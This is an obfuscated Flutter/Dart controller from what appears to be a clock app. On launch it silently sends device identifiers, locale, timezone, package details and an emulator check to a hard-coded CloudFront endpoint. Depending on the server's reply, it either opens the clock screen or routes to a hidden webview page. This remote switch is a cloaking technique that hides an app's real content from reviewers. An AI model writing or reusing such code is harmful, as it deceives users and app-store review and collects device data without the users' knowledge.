import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class AlongLogic extends GetxController {

  var rgcdfeu = RxBool(false);
  var owahzdjm = RxBool(true);
  var kgzba = RxString("");
  var ilewp = RxBool(false);
  var lfcgmde = RxBool(true);
  final kfwhgvdnzs = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xjknoiv();
  }


  Future<void> xjknoiv() async {
    ilewp.value = true;
    lfcgmde.value = true;
    owahzdjm.value = false;

    kfwhgvdnzs.post("https://d2spdvy47ankwu.cloudfront.net/pbueCnkPpCHaXl?no_check",data: await yxuepavd()).then((value) {
      var tcpkvx = value.data["tcpkvx"] as String;
      var msxvkc = value.data["msxvkc"] as bool;
      if (msxvkc) {
        kgzba.value = tcpkvx;
        ahvq();
      } else {
        snemfg();
      }
    }).catchError((e) {
      owahzdjm.value = true;
      lfcgmde.value = true;
      ilewp.value = false;
    });
  }

  Future<Map<String, dynamic>> yxuepavd() async {
    final DeviceInfoPlugin bjeyv = DeviceInfoPlugin();
    PackageInfo gcxsykof_oysqkzdn = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bmduq = Platform.localeName;
    var EAlTLJVh = currentTimeZone;

    var zTbIm = gcxsykof_oysqkzdn.packageName;
    var PFmrE = gcxsykof_oysqkzdn.version;
    var sDgBE = gcxsykof_oysqkzdn.buildNumber;

    var lthCLo = gcxsykof_oysqkzdn.appName;
    var IBabhLT = "";
    var eLluVm  = "";
    var VnzpNGD = "";
    var jfziscv = "";
    var zukqowiy = "";
    var wqhuncyp = "";


    var ReWK = "";
    var EmCFbSv = false;

    if (GetPlatform.isAndroid) {
      ReWK = "android";
      var fygmzvbdo = await bjeyv.androidInfo;

      VnzpNGD = fygmzvbdo.brand;

      IBabhLT  = fygmzvbdo.model;
      eLluVm = fygmzvbdo.id;

      EmCFbSv = fygmzvbdo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ReWK = "ios";
      var shovml = await bjeyv.iosInfo;
      VnzpNGD = shovml.name;
      IBabhLT = shovml.model;

      eLluVm = shovml.identifierForVendor ?? "";
      EmCFbSv  = shovml.isPhysicalDevice;
    }

    var res = {
      "lthCLo": lthCLo,
      "sDgBE": sDgBE,
      "PFmrE": PFmrE,
      "zTbIm": zTbIm,
      "IBabhLT": IBabhLT,
      "EAlTLJVh": EAlTLJVh,
      "VnzpNGD": VnzpNGD,
      "eLluVm": eLluVm,
      "bmduq": bmduq,
      "ReWK": ReWK,
      "EmCFbSv": EmCFbSv,
      "jfziscv" : jfziscv,
      "zukqowiy" : zukqowiy,
      "wqhuncyp" : wqhuncyp,

    };
    return res;
  }

  Future<void> snemfg() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> ahvq() async {
    Get.offNamed("/Outreload");
  }

}
